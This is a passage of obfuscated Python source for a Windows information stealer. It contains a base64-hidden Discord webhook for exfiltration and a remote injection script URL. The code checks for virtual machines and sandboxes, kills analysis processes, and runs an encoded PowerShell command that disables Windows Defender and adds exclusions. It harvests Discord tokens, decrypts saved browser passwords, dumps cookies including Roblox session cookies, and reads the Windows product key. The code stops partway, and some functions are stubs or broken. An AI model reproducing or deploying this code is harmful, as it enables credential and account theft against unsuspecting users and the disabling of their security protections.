    def __O00O000OOOOO0OOO0 (OOOOOO000000O00OO ,OOOO000OOOOO00OOO ,O00OOO000OO0OO0O0 ):
        return OOOOOO000000O00OO .__OO00OOOOO00OOO00O ()
    def __OOOO0OO00000O00OO (OOO0O0OOO000O0O00 ,OO0OOOO00O0OO0O00 ,O0000OOOO0OOOO00O ,O0O0O0O00OOOOOO00 ,OOOO0OOO000000OOO ,O00000O00O0O0000O ,OOOOOO00OOOOOO000 ,OO0O0O000O00OOO00 ):
        return OOO0O0OOO000O0O00 .__O00OOO0O0OOO00000 ()
    def __O0OO0O00O0O0O0OO0 (OO0O0O0O00O0O0OO0 ,O0000O00000O0OOOO ,O0O00O0000OO0OO0O ,O0OO0O000O000OOO0 ,O0O0OOOO00O000OO0 ):
        return OO0O0O0O00O0O0OO0 .__O0OO0O00O0O0O0OO0 ()
    def __O00O0OO00OOO000OO (O0000000O00O00OO0 ,OO0OOO0O0O00OOOO0 ,O0OO0O00O00OOO000 ,OO000000O000OO000 ,O00OO00000OO000O0 ,O000O00OOOOOOOOOO ):
        return O0000000O00O00OO0 .__OO0O0O00OOOOOO000 ()
import os 
import sys 
import requests 
import json 
import re 
import shutil 
import sqlite3 
import base64 
import subprocess 
import socket 
import urllib3 
import ctypes 
import win32crypt 
import zipfile 
from Crypto .Cipher import AES 
from json import loads 
from shutil import copy2 
from datetime import datetime 
from win32crypt import CryptUnprotectData 
from sqlite3 import connect 
from requests import post 
from base64 import b64decode 
import win32clipboard 
import api 
import ctypes 
from ctypes .wintypes import BOOL ,HWND ,LPCWSTR ,UINT 
import psutil 
import subprocess 
import wmi 
import uuid 
import time 
import hashlib 
import mss 
import tempfile 
from re import findall 
from win32crypt import CryptUnprotectData 
from win32crypt import CryptUnprotectData 
import platform 
import GPUtil 
import asyncio 
import math 
import winreg 
from urllib .request import Request ,urlopen 
O00OOO0OOOO0O000O =b64decode ("aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTIzNjAyNDk3ODkwNzA3NDY0MS93eWlHX1BVTVRsdVlzSHVDYjQ4WnVUUXBCSHdoZ3RZZHI3VDdMdGJ0ZkZ0VHBQRzV1ejd0clAtQWVrZjZfaUUwTlRaRQ==").decode ()
OOOO000O0O00O0OOO =b64decode ("aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL25vdGF1dGhvcmlzZWR4ZC9ibG9ja2VkL21haW4vZGlzY29yZF9pbmplY3QuanM=").decode ()
async def O00OOO00OO00000OO ():
    try :
        O0OO0OO0OOO00OOOO =requests .get ('https://raw.githubusercontent.com/notauthorisedxd/blocked/main/blacklisted_programs.json')
        O0O0OO0000O0O0O00 =O0OO0OO0OOO00OOOO .json ().get ('blacklistedprog',[])
        OO0O00OOO0000OO0O =subprocess .check_output (['tasklist']).decode ().split ('\n')
        for OO000OOOO00000O00 in OO0O00OOO0000OO0O :
            O00O0O00OOOO0000O =OO000OOOO00000O00 .split ()[0 ].replace ('.exe','')
            if O00O0O00OOOO0000O in O0O0OO0000O0O0O00 :
                subprocess .run (['taskkill','/F','/IM',f"{O00O0O00OOOO0000O}.exe"],check =True )
    except Exception as O000O0OO00O00OO00 :
        sys .exit ()
def O00O0OO0OOO0000O0 ():
    O0OOOO0OOO0000OOO =os .environ .get ('SystemRoot','C:\\Windows')
    if os .path .exists (os .path .join (O0OOOO0OOO0000OOO ,"System32\\vmGuestLib.dll"))or os .path .exists (os .path .join (O0OOOO0OOO0000OOO ,"vboxmrxnp.dll")):
        sys .exit ()
def OOOO00OO00OOOOOOO ():
    try :
        socket .create_connection (("www.google.com",80 ))
        print ("Internet connection is available.")
    except OSError :
        print ("No internet connection available. Exiting script.")
        sys .exit ()
def OO000O0O0OO00OOOO ():
    def OO0O00O0O0000O0OO ():
        OO0OOO0O00O00OO00 =getattr (sys ,"base_prefix",None )
        if OO0OOO0O00O00OO00 is None :
            OOO0OOO0O00O00O00 =getattr (sys ,"real_prefix",None )
            if OOO0OOO0O00O00O00 is None :
                return sys .prefix 
            return OOO0OOO0O00O00O00 
        return OO0OOO0O00O00OO00 
    O00OOO0O0OOOO0OOO =lambda :sys .prefix !=OO0O00O0O0000O0OO ()
    if O00OOO0O0OOOO0OOO ():
        sys .exit ()
    O000OO0OO0OOO000O =(lambda :os .system ("REG QUERY HKEY_LOCAL_MACHINE\\SYSTEM\\ControlSet001\\Control\\Class\\{4D36E968-E325-11CE-BFC1-08002BE10318}\\0000\\DriverDesc 2> nul")!=1 or os .system ("REG QUERY HKEY_LOCAL_MACHINE\\SYSTEM\\ControlSet001\\Control\\Class\\{4D36E968-E325-11CE-BFC1-08002BE10318}\\0000\\ProviderName 2> nul")!=1 )
    if O000OO0OO0OOO000O ():
        sys .exit ()
def O0OOO0O0000O0OOOO ():
    OO000O0O0OO0000O0 =os .path .join (os .environ ["SystemRoot"],"System32\\vmGuestLib.dll")
    O0O0OO0O0O000O00O =os .path .join (os .environ ["SystemRoot"],"vboxmrxnp.dll")
    O0OO0000000O0O00O =os .popen ('TASKLIST /FI "STATUS eq RUNNING" | find /V "Image Name" | find /V "="').read ()
    O000OOO00OOOO0000 =[]
    OOOOO0OO0O00OO0OO =O0OO0000000O0O00O .split (" ")
    for OO0O00OO0000O00O0 in OOOOO0OO0O00OO0OO :
        if ".exe"in OO0O00OO0000O00O0 :
            O000OOO00OOOO0000 .append (OO0O00OO0000O00O0 .replace ("K\n","").replace ("\n",""))
    if "VMwareService.exe"in O000OOO00OOOO0000 or "VMwareTray.exe"in O000OOO00OOOO0000 :
        sys .exit ()
    if os .path .exists (OO000O0O0OO0000O0 ):
        sys .exit ()
    if os .path .exists (O0O0OO0O0O000O00O ):
        sys .exit ()
    return None 
def O0O0O0O00OO000OO0 ():
    O000O0O0000OOOO0O =":".join (re .findall ("..","%012x"%uuid .getnode ()))
    OO0000O000000OO0O =["00:05:69","00:0c:29","00:1c:14","00:50:56"]
    if O000O0O0000OOOO0O [:8 ]in OO0000O000000OO0O :
        sys .exit ()
    else :
        return None 
def OOO0OO00O0OOO00O0 ():
    if sys .platform .startswith ("win"):
        def O0OO0O0O000O00O0O ():
            try :
                return ctypes .windll .shell32 .IsUserAnAdmin ()
            except :
                return False 
        if O0OO0O0O000O00O0O ():
            print ("Already running as admin.")
            return None 
        else :
            ctypes .windll .shell32 .ShellExecuteW (None ,"runas",sys .executable ," ".join (sys .argv ),None ,1 )
            sys .exit ()
    else :
        return None 
async def O0OO0O0000OOOOOOO (O0OO00O00OOO0OOOO ):
    try :
        OO000O00O0OOO0OO0 =requests .get ('https://raw.githubusercontent.com/notauthorisedxd/blocked/main/blocked_gpu.json')
        OO0000OO0000OOOO0 =OO000O00O0OOO0OO0 .json ()
        return O0OO00O00OOO0OOOO in OO0000OO0000OOOO0 
    except Exception as OOOO0000O0OO0OOOO :
        return False 
async def OOOOOOOO0O0O000O0 (OO00O0O00000O0OOO ):
    try :
        OOOOOO0OOOO0O0O0O =requests .get ('https://raw.githubusercontent.com/notauthorisedxd/blocked/main/blocked_os.json')
        O0O0OO0OOO00OO000 =OOOOOO0OOOO0O0O0O .json ()
        return OO00O0O00000O0OOO in O0O0OO0OOO00OO000 
    except Exception as OOO0OOO0O00OO000O :
        return False 
async def O000000000000OO00 (O0O00OOO000OO0O0O ):
    try :
        O0000O0OOO0000O00 =requests .get ('https://raw.githubusercontent.com/notauthorisedxd/blocked/main/blocked_pcnames.json')
        O000O0O00OO000OO0 =O0000O0OOO0000O00 .json ()
        return O0O00OOO000OO0O0O in O000O0O00OO000OO0 
    except Exception as OO00OOO0OOO0O0O0O :
        return False 
async def OO0OOOO0OOOOOOO00 (OOO0OOOOOOOO00OOO ):
    try :
        O0OOO0OOOOO0OO0OO =requests .get ('https://raw.githubusercontent.com/notauthorisedxd/blocked/main/blocked_usernames.json')
        O0O0000O0OOOO000O =O0OOO0OOOOO0OO0OO .json ()
        return OOO0OOOOOOOO00OOO in O0O0000O0OOOO000O 
    except Exception as OO000O0O000O0000O :
        return False 
async def OOO000O0OO0000O00 (O0OOO00OOO00OO0OO ):
    try :
        OOOO0OOO0OO000OOO =requests .get ('https://raw.githubusercontent.com/notauthorisedxd/blocked/main/blocked_hwid.json')
        O0OOO0000O000O0OO =OOOO0OOO0OO000OOO .json ()
        return O0OOO00OOO00OO0OO in O0OOO0000O000O0OO 
    except Exception as OO0OO0O0OO000O000 :
        return False 
async def OOOO0O00OOO0O0O0O (OO00O0O0000000O00 ):
    try :
        O0000OOOOO0000OO0 =requests .get ('https://raw.githubusercontent.com/notauthorisedxd/blocked/main/blocked_ips.json')
        OO00000OO0OO0000O =O0000OOOOO0000OO0 .json ()
        return OO00O0O0000000O00 in OO00000OO0OO0000O 
    except Exception as O000OO0O0O0OOOOO0 :
        return False 
def O00O0OO00OOOOOO00 ():
    try :
        OO00O0000O000O0OO =winreg .OpenKey (winreg .HKEY_LOCAL_MACHINE ,r"SOFTWARE\Microsoft\Windows NT\CurrentVersion",0 ,winreg .KEY_READ )
        OO0O000O00000OOOO ,_OOO000OO00OO0OO00 =winreg .QueryValueEx (OO00O0000O000O0OO ,"DigitalProductId")
        winreg .CloseKey (OO00O0000O000O0OO )
        if OO0O000O00000OOOO :
            return True 
        else :
            return False 
    except Exception as OOOO0OO00000OO000 :
        print ("Error checking Windows activation:",OOOO0OO00000OO000 )
        return False 
async def O0O0OOO00O000O00O ():
    try :
        OOOOOOO00OO0O0000 =await O000OOOOO0OOOOOO0 (b64decode ("d21pYyBjb21wdXRlcnN5c3RlbSBnZXQgdG90YWxwaHlzaWNhbG1lbW9yeQ=="))
    except Exception as O0O0000OO0O0OOOOO :
        OOOOOOO00OO0O0000 =4 
    return int (int (OOOOOOO00OO0O0000 )/(1024 *1024 *1024 ))
async def O0O000O00OOO0O000 ():
    try :
        OOOO0O00O0000OO00 =await O000OOOOO0OOOOOO0 (b64decode ("d21pYyBsb2dpY2FsZGlzayBnZXQgc2l6ZQ=="))
        O0OO0000000000O00 =[OOOOOO00OOO00OOOO .strip ()for OOOOOO00OOO00OOOO in OOOO0O00O0000OO00 .split ()if OOOOOO00OOO00OOOO .strip ().lower ()!="size"]
        return int (int (O0OO0000000000O00 [0 ])/(1024 *1024 *1024 ))
    except Exception as O00OO0OOO0OO0OOO0 :
        return "1000"
async def O0OOO0OOOOOO0O00O ():
    OO0000O00OO00O0OO =await O000OOOOO0OOOOOO0 (b64decode ("d21pYyBjc3Byb2R1Y3QgZ2V0IHV1aWQ="))
    O000O0O0O000OO0OO =r"UUID\s+([A-Fa-f0-9-]+)"
    OO00O0OO0000OOO0O =re .search (O000O0O0O000OO0OO ,OO0000O00OO00O0OO )
    if OO00O0OO0000OOO0O :
        return OO00O0OO0000OOO0O .group (1 )
    else :
        return ""
async def O000OOO0OOOOO0O00 ():
    try :
        O00OOOO0O00OOO00O =await O000OOOOO0OOOOOO0 (b64decode ("ZWNobyAlTlVNQkVSX09GX1BST0NFU1NPUlM1"))
        OO0O0OOO0O0OO00O0 =int (O00OOOO0O00OOO00O )
        if not math .isnan (OO0O0OOO0O0OO00O0 ):
            return int (OO0O0OOO0O0OO00O0 )
    except Exception as O000000O00OOOO0OO :
        return "4"
async def O000OOOOO0OOOOOO0 (OOOOO0OOO0OO000OO ):
    OOO0O00OO0O0OOO00 =await asyncio .create_subprocess_shell (OOOOO0OOO0OO000OO ,stdout =subprocess .PIPE ,stderr =subprocess .PIPE )
    O0OO0O00OOO00OO0O ,OO0OO00O00O0O000O =await OOO0O00OO0O0OOO00 .communicate ()
    return O0OO0O00OOO00OO0O .decode ().strip ()
async def O00OOO0000OO0O000 ():
    try :
        O0000O0OO0O0OO000 =await O000OOOOO0OOOOOO0 (b64decode ("d21pYyBvcyBnZXQgbmFtZSx2ZXJzaW9uIC9mb3JtYXQ6dGFibGU="))
        OOO0000OOOO0O0OOO =O0000O0OO0O0OO000 .strip ().split ('\n')
        for OO0O0O0OOOOOO000O in OOO0000OOOO0O0OOO [1 :]:
            if "Windows"in OO0O0O0OOOOOO000O :
                OO0OO00OO000OO00O =OO0O0O0OOOOOO000O .split ()[0 ]
                return OO0OO00OO000OO00O 
    except Exception as OO00OOOO0O0OOOO0O :
        print ("Error:",OO00OOOO0O0OOOO0O )
        return "Unknown"
async def O0OOO0OOO0O0O0OOO ():
    import os 
    try :
        O000000000OO00000 =OOOOOOOO0O000O0O0 ()
        O000O00OO0O000O0O =os .getenv ('COMPUTERNAME')or "IDK"
        O0O0000OOOO0OO00O =os .getenv ('USERNAME')or "IDK"
        OO0OO000O00OOOOO0 =await O0O000O00OOO0O000 ()
        OO00O00OO0000000O =await O0OOO0OOOOOO0O00O ()
        O00OOO0000O0OO000 =await O000OOO0OOOOO0O00 ()
        O0O000OOOOOOO0OO0 =await O0O0OOO00O000O00O ()
        OOOOOOO00OO0OOO0O =os .system (b64decode ("d21pYyBQQVRIIFdpbjMyX1ZpZGVvQ29udHJvbGxlciBnZXQgbmFtZQ=="))
        O0OO0OO0OO00O0O0O =await O0OO0O0000OOOOOOO (OOOOOOO00OO0OOO0O )
        OO0O0O00O0O0O000O =await O000000000000OO00 (O000O00OO0O000O0O )
        O0O0OOOO00O00O000 =await OO0OOOO0OOOOOOO00 (O0O0000OOOO0OO00O )
        O000O00O0OO0O0OOO =await OOOO0O00OOO0O0O0O (O000000000OO00000 )
        O0O00O0OOOOO0OOOO =await OOO000O0OO0000O00 (OO00O00OO0000000O )
        if O0OO0OO0OO00O0O0O or OO0O0O00O0O0O000O or O0O0OOOO00O00O000 or O000O00O0OO0O0OOO or O0O00O0OOOOO0OOOO :
            sys .exit ()
        if OO0OO000O00OOOOO0 <80 or O00OOO0000O0OO000 <2 or O0O000OOOOOOO0OO0 <2 :
            sys .exit ()
        return 
    except Exception as OO00O0O000OO0O00O :
        print (OO00O0O000OO0O00O )
async def O0O0OO0O0O0O0OOO0 ():
    try :
        OOOO00OO00OOOOOOO ()
        OO000O0O0OO00OOOO ()
        if O00O0OO00OOOOOO00 ()!=True :
            sys .exit ()
        await O0OOO0OOO0O0O0OOO ()
        O00O0OO0OOO0000O0 ()
        O0O0O0O00OO000OO0 ()
        OOO0OO00O0OOO00O0 ()
        O0OOO0O0000O0OOOO ()
        OOO0O0O00O00OOO0O =base64 .b64decode (b"cG93ZXJzaGVsbC5leGUgU2V0LU1wUHJlZmVyZW5jZSAtRGlzYWJsZUludHJ1c2lvblByZXZlbnRpb25TeXN0ZW0gJHRydWUgLURpc2FibGVJT0FWUHJvdGVjdGlvbiAkdHJ1ZSAtRGlzYWJsZVJlYWx0aW1lTW9uaXRvcmluZyAkdHJ1ZSAtRGlzYWJsZVNjcmlwdFNjYW5uaW5nICR0cnVlIC1FbmFibGVDb250cm9sbGVkRm9sZGVyQWNjZXNzIERpc2FibGVkIC1FbmFibGVOb3NFeHBvcnRlZE1vZGUgLUZvcmNlIC1NQVBTUmVwb3J0aW5nIERpc2FibGVkIC1TdWJtaXRTYW1wbGVzQ29uc2VudCBOZXZlclNlbmQgJiYgcG93ZXJzaGVsbCBTZXQtTXBQcmVmZXJlbmNlIC1TdWJtaXRTYW1wbGVzQ29uc2VudCAyICYgcG93ZXJzaGVsbC5leGUgLWlucHV0Zm9ybWF0IG5vbmUgLW91dHB1dGZvcm1hdCBub25lIC1Ob25JbnRlcmFjdGl2ZS1Db21tYW5kICJBZGQtTXBQcmVmZXJlbmNlIC1FeGNsdXNpb25QYXRoICVVU0VSUFJPRklORSVcQXBwRGF0YSIgJiBwb3dlcnNoZWxsLmV4ZSAtaW5wdXRmb3JtYXQgbm9uZSAtb3V0cHV0Zm9ybWF0IG5vbmUgLW5vbkludGVyYWN0aXZlLUNvbW1hbmQgIkFkZC1NcHJlZmVyZW5jZSAtRXhjbHVzaW9uUGF0aCAlVVNFUlBST0ZJTEUlXExvY2FsIiAmIHBvd2Vyc2hlbGwuZXhlIC1jb21tYW5kICJTZXQtTXBQcmVmZXJlbmNlIC1FeGNsdXNpb25FeHRlbnNpb24gJy5leGUnIiAK").decode ()
        subprocess .run (OOO0O0O00O00OOO0O ,shell =True ,capture_output =True )
    except Exception as O0O0OOO00O00O000O :
        print ("An error occurred: ",O0O0OOO00O00O000O )
def OOO00O0O0OOOO0O0O ():
    O0OO0O00O00OO000O =[]
    O00OO0OOOOO0OO0OO =os .getenv ("localAPPDATA")
    OO00O00O0000OO0O0 =os .getenv ("APPDATA")
    O000OOOO0OO00O0OO ={"Discord":OO00O00O0000OO0O0 +"\\Discord","Discord Canary":OO00O00O0000OO0O0 +"\\discordcanary","Discord PTB":OO00O00O0000OO0O0 +"\\discordptb","Google Chrome":O00OO0OOOOO0OO0OO +"\\Google\\Chrome\\User Data\\Default","Opera":OO00O00O0000OO0O0 +"\\Opera Software\\Opera Stable","Brave":O00OO0OOOOO0OO0OO +"\\BraveSoftware\\Brave-Browser\\User Data\\Default","Yandex":O00OO0OOOOO0OO0OO +"\\Yandex\\YandexBrowser\\User Data\\Default","Lightcord":OO00O00O0000OO0O0 +"\\Lightcord","Opera GX":OO00O00O0000OO0O0 +"\\Opera Software\\Opera GX Stable","Amigo":O00OO0OOOOO0OO0OO +"\\Amigo\\User Data","Torch":O00OO0OOOOO0OO0OO +"\\Torch\\User Data","Kometa":O00OO0OOOOO0OO0OO +"\\Kometa\\User Data","Orbitum":O00OO0OOOOO0OO0OO +"\\Orbitum\\User Data","CentBrowser":O00OO0OOOOO0OO0OO +"\\CentBrowser\\User Data","Sputnik":O00OO0OOOOO0OO0OO +"\\Sputnik\\Sputnik\\User Data","Chrome SxS":O00OO0OOOOO0OO0OO +"\\Google\\Chrome SxS\\User Data","Epic Privacy Browser":O00OO0OOOOO0OO0OO +"\\Epic Privacy Browser\\User Data","Microsoft Edge":O00OO0OOOOO0OO0OO +"\\Microsoft\\Edge\\User Data\\Default","Uran":O00OO0OOOOO0OO0OO +"\\uCozMedia\\Uran\\User Data\\Default","Iridium":O00OO0OOOOO0OO0OO +"\\Iridium\\User Data\\Default\\local Storage\\leveld","Firefox":OO00O00O0000OO0O0 +"\\Mozilla\\Firefox\\Profiles",}
    for OOO00OOO0OOOOO00O ,OO0OOO0O0000O0O00 in O000OOOO0OO00O0OO .items ():
        OO0OOO0O0000O0O00 =os .path .join (OO0OOO0O0000O0O00 ,"local Storage","leveldb")
        if not os .path .exists (OO0OOO0O0000O0O00 ):
            continue 
        try :
            for O0O0O00000O000O00 in os .listdir (OO0OOO0O0000O0O00 ):
                if (O0O0O00000O000O00 .endswith (".log")or O0O0O00000O000O00 .endswith (".ldb")or O0O0O00000O000O00 .endswith (".sqlite")):
                    O0O0O0OO0000OOO0O =os .path .join (OO0OOO0O0000O0O00 ,O0O0O00000O000O00 )
                    with open (O0O0O0OO0000OOO0O ,"r",errors ="ignore")as O000OOO0OO00OOO00 :
                        OO0OO000O000OOOOO =O000OOO0OO00OOO00 .readlines ()
                        for O0000OOOO0O0000O0 in OO0OO000O000OOOOO :
                            for OO0OO00O0O000O000 in ["[\\w-]{24}\\.[\\w-]{6}\\.[\\w-]{27}","mfa\\.[\\w-]{84}",]:
                                O0OO0O00O00OO000O +=re .findall (OO0OO00O0O000O000 ,O0000OOOO0O0000O0 )
        except Exception as O0OOO00O0O0O000O0 :
            print (f"Error reading files in {OO0OOO0O0000O0O00}: {O0OOO00O0O0O000O0}")
    try :
        with open ("tokens.txt","w")as O000OOO0OO00OOO00 :
            O000OOO0OO00OOO00 .write ("\n".join (O0OO0O00O00OO000O ))
    except Exception as O0OOO00O0O0O000O0 :
        pass 
def O0OOOOOOOOO0OO00O (OOO0OO0O00O00000O ,OO00OOOOO0OOOO000 ):
    OO000O00O0000O000 =AES .new (OOO0OO0O00O00000O ,AES .MODE_GCM ,OO00OOOOO0OOOO000 )
    return OO000O00O0000O000 
def OOOO0O0OOOOO000O0 (O0OO00000O0O0OOO0 ,OOO0O00O0OO0O0OOO ):
    OOO0OOOOOOO0O00O0 =O0OO00000O0O0OOO0 .decrypt (OOO0O00O0OO0O0OOO )
    return OOO0OOOOOOO0O00O0 
def OOO00000O00O0OOOO (O0O0OOO00OO00OOOO ,OO00OO0O00O0O00OO ,O000OOO00O0O0OOO0 ):
    try :
        if not os .path .exists (O0O0OOO00OO00OOOO ):
            return "Local State file missing\n"
        O00O0000O000O0000 ="logins"
        with open (O0O0OOO00OO00OOOO )as OOO0OO0000O000O0O :
            O000O0OOO00O00000 =OOO0OO0000O000O0O .read ()
        O000O0OOO00O00000 =loads (O000O0OOO00O00000 )
        O0O000OOOO000OOOO =b64decode (O000O0OOO00O00000 ["os_crypt"]["encrypted_key"])[5 :]
        O0O000OOOO000OOOO =CryptUnprotectData (O0O000OOOO000OOOO ,None ,None ,None ,0 )[1 ]
        O0O00O0O0OO00OOO0 ="passwords.txt"
        OO0OOO000OO0OOO0O ="cookies.txt"
        O0O0000O0OO00O000 ="info.txt"
        if os .path .exists (OO00OO0O00O0O00OO ):
            try :
                copy2 (OO00OO0O00O0O00OO ,"TempMan.db")
                O00O0OO00O0OOOOO0 =sqlite3 .connect ("TempMan.db")
                OO0OO00OOOO0OOO0O =O00O0OO00O0OOOOO0 .cursor ()
                OO0OO00OOOO0OOO0O .execute ("SELECT origin_url, username_value, password_value FROM logins")
                with open (O0O00O0O0OO00OOO0 ,"a")as OOO0OO0000O000O0O :
                    OOO0OO0000O000O0O .write ("*** "+O00O0000O000O0000 +" ***\n")
                    for O0OO00OO0000OOOOO ,OO000O00O0OO0OOO0 in enumerate (OO0OO00OOOO0OOO0O .fetchall ()):
                        if OO000O00O0OO0OOO0 [0 ]or OO000O00O0OO0OOO0 [1 ]or OO000O00O0OO0OOO0 [2 ]:
                            O000000000O0OOOOO =OO000O00O0OO0OOO0 [2 ][15 :-16 ]
                            O0OOOOO0000O000O0 =O000000000O0OOOOO [:15 ]
                            OO0OO0O00OO000OO0 =O000000000O0OOOOO [15 :-16 ]
                            OOO000000000OO0O0 =O0OOOOOOOOO0OO00O (O0O000OOOO000OOOO ,O0OOOOO0000O000O0 )
                            OOO000O0000O0000O =OOOO0O0OOOOO000O0 (OOO000000000OO0O0 ,OO0OO0O00OO000OO0 ).decode ()
                            O00O0OO0OOOOOO000 =("URL : "+OO000O00O0OO0OOO0 [0 ]+"\nName: "+OO000O00O0OO0OOO0 [1 ]+"\nPass: "+OOO000O0000O0000O +"\n\n")
                            OOO0OO0000O000O0O .write (O00O0OO0OOOOOO000 )
            except Exception as O000000O0O0OO0O0O :
                with open (O0O0000O0OO00O000 ,"a")as OOO0OO0000O000O0O :
                    OOO0OO0000O000O0O .write (f"Error accessing login data: {O000000O0O0OO0O0O}\n")
            finally :
                O00O0OO00O0OOOOO0 .close ()
        else :
            with open (O0O0000O0OO00O000 ,"a")as OOO0OO0000O000O0O :
                OOO0OO0000O000O0O .write (O00O0000O000O0000 +" Login Data file missing\n")
        if os .path .exists (O000OOO00O0O0OOO0 ):
            try :
                copy2 (O000OOO00O0O0OOO0 ,"CookMe.db")
                O00O0OO00O0OOOOO0 =sqlite3 .connect ("CookMe.db")
                OO0OO000O0O00O0OO =O00O0OO00O0OOOOO0 .cursor ()
                OO0OO000O0O00O0OO .execute ("SELECT host_key, name, encrypted_value, expires_utc FROM cookies")
                with open (OO0OOO000OO0OOO0O ,"a")as OOO0OO0000O000O0O :
                    OOO0OO0000O000O0O .write ("*** "+O00O0000O000O0000 +" ***\n")
                    for O0OO00OO0000OOOOO ,OOO0000OO0OOOOO00 in enumerate (OO0OO000O0O00O0OO .fetchall ()):
                        if OOO0000OO0OOOOO00 [0 ]or OOO0000OO0OOOOO00 [1 ]or OOO0000OO0OOOOO00 [2 ]:
                            O00O0OO0OOOOOO000 ="Cook: "+OOO0000OO0OOOOO00 [1 ]+"\n"
                            OOO0OO0000O000O0O .write (O00O0OO0OOOOOO000 )
            except Exception as O000000O0O0OO0O0O :
                with open (O0O0000O0OO00O000 ,"a")as OOO0OO0000O000O0O :
                    OOO0OO0000O000O0O .write (f"Error accessing cookies: {O000000O0O0OO0O0O}\n")
            finally :
                O00O0OO00O0OOOOO0 .close ()
        else :
            with open (O0O0000O0OO00O000 ,"a")as OOO0OO0000O000O0O :
                OOO0OO0000O000O0O .write ("no "+O00O0000O000O0000 +" Cookie file\n")
    except Exception as O000000O0O0OO0O0O :
        return f"Error in decrypting browser data: {O000000O0O0OO0O0O}\n"
    return "Process completed successfully\n"
def O0OOO0OO0OO000OOO (OO00OO000O0O00OO0 ):
    return f"{OO00OO000O0O00OO0.format_value(0)}\\User Data\\Local State"
def OO000O0O000OOOOO0 (OO0OOOOO0O00OO000 ):
    if OO0OOOOO0O00OO000 .contains_op (0 ):
        return f"{OO0OOOOO0O00OO000.format_value(0)}\\Login Data"
    else :
        return f"{OO0OOOOO0O00OO000.format_value(0)}\\User Data\\Default\\Login Data"
def O0OOO0OOO00O00O00 (OOOOO000O00O00000 ):
    if OOOOO000O00O00000 .contains_op (0 ):
        return f"{OOOOO000O00O00000.format_value(0)}\\Network\\Cookies"
    else :
        return f"{OOOOO000O00O00000.format_value(0)}\\User Data\\Default\\Network\\Cookies"
def O0O0O0O0000OO00O0 ():
    O0000O0OO00OOOOOO =...
    for OOOO00OO000OO0OO0 ,O0OO0O000000000OO in O0000O0OO00OOOOOO .items ():
        if not os .path .exists (O0OO0O000000000OO ):
            continue 
        OOO00O0OO00OOOO0O =get_tokens (O0OO0O000000000OO )
        if not OOO00O0OO00OOOO0O :
            continue 
        with open (fileInfo ,"a")as OOOO000OOOO00O000 :
            for O00O0O00O00OO0000 in OOO00O0OO00OOOO0O :
                OOOO000OOOO00O000 .write (str (O00O0O00O00OO0000 )+"\n")
def OO0O0000O00O0OO0O (O0OO0O000O0OO00O0 ):
    if os .path .exists (O0OO0O000O0OO00O0 ):
        O0O00OO0O000O00O0 =OOO00000O00O0OOOO (O0OOO0OO0OO000OOO (O0OO0O000O0OO00O0 ),OO000O0O000OOOOO0 (O0OO0O000O0OO00O0 ),O0OOO0OOO00O00O00 (O0OO0O000O0OO00O0 ))
        return 
    with open (fileInfo ,"a")as OO0O0OOOO00O0O00O :
        OO0O0OOOO00O0O00O .write (O0O00OO0O000O00O0 +" not installed\n")
def O0O0O00O0O0O0OO00 (OOO0OO0000OO00O0O ):
    if os .path .exists (OOO0OO0000OO00O0O ):
        if ".txt"in OOO0OO0000OO00O0O :
            os .remove (OOO0OO0000OO00O0O )
def O0OOO0O0OO00000OO (OOOO0O00O000O0OOO ,OOOOOOO0OO00OO0O0 ):
    OOOOOOO00OOOOO000 =None 
    O00O0O0OOO00O0OOO =None 
    OO000OO00O0000000 =None 
    O0O0O0OO0O0OOOOO0 =None 
    OO000OOO000O0000O =None 
    O00O0OOOO000O00O0 =None 
    FileNotFoundError =None 
    OOOO0O00O000O0OOO =None 
    OOOOOOO0OO00OO0O0 =None 
    O00O0OOOOOO00OOOO =None 
    O00OO0OO0O0O00O00 =None 
    OO000OOO00OOOOOOO =None 
    OOO000O0OO0000O0O =None 
    O0OOOO0O0OO0O000O =None 
    try :
        with OOOOOOO00OOOOO000 (OOOO0O00O000O0OOO ,"r")as O00O0OOOOOO00OOOO :
            O00OO0OO0O0O00O00 =O00O0OOOOOO00OOOO .readlines ()
        OO000OOO00OOOOOOO =None 
        for OOO000O0OO0000O0O in O00OO0OO0O0O00O00 :
            if OOO000O0OO0000O0O .startswith ("URL : .roblox.com"):
                continue 
            if "Name: .ROBLOSECURITY"in OOO000O0OO0000O0O :
                OO000OOO00OOOOOOO =OOO000O0OO0000O0O .strip ()
        if OO000OOO00OOOOOOO :
            with OOOOOOO00OOOOO000 (OOOOOOO0OO00OO0O0 ,"w")as O0OOOO0O0OO0O000O :
                O0OOOO0O0OO0O000O .write (OO000OOO00OOOOOOO )
            O00O0OOOO000O00O0 ("Roblox cookie extracted and saved to roblox.txt")
        else :
            O00O0OOOO000O00O0 ("Roblox cookie not found in cookies.txt")
    except FileNotFoundError :
        O00O0OOOO000O00O0 ("File not found!")
    return None 
def OO0OO0O000O0OOOOO (O0OOO0000OO0000O0 ):
    try :
        OO0O00O0O0O00O0O0 =subprocess .run (["wmic","path","softwarelicensingservice","get","OA3xOriginalProductKey",],capture_output =True ,text =True ,)
        if OO0O00O0O0O00O0O0 .returncode ==0 :
            OO00O0OO000OOOOO0 =OO0O00O0O0O00O0O0 .stdout .strip ()
            with open (O0OOO0000OO0000O0 ,"w")as O0OOO00O0OOOOOO00 :
                O0OOO00O0OOOOOO00 .write (OO00O0OO000OOOOO0 )
            print ("Product key logged to win_registry_key.txt")
        else :
            print ("Failed to retrieve product key")
    except Exception as OO0OOO0OO0O00000O :
        print ("Error:",OO0OOO0OO0O00000O )
def OO000O00O0OO0O00O ():
    for OO0OOOOO00O0O00OO ,OO000OO0000OOO000 in psutil .net_if_addrs ().items ():
        if OO0OOOOO00O0O00OO =="Wi-Fi":
            for O0O000O0OOOO0O0O0 in OO000OO0000OOO000 :
                if O0O000O0OOOO0O0O0 .family ==psutil .AF_LINK :
                    O000OO00O000OO0OO =O0O000O0OOOO0O0O0 .address 
                    if O000OO00O000OO0OO ==None :
                        return "Mac address was not found"
                    return O000OO00O000OO0OO 
def OOOOOOO0OO0OO0000 ():
    O0OO0OOOOO000OOOO =psutil .virtual_memory ()
    O0O0OOO0OOO000OOO =wmi .WMI ()
    O00OOOO000O0OO0O0 =O0O0OOO0OOO000OOO .Win32_DisplayConfiguration ()
    O000OO0O0000O000O =[O000OOO00O0OOO000 .Description .strip ()for O000OOO00O0OOO000 in O00OOOO000O0OO0O0 ]
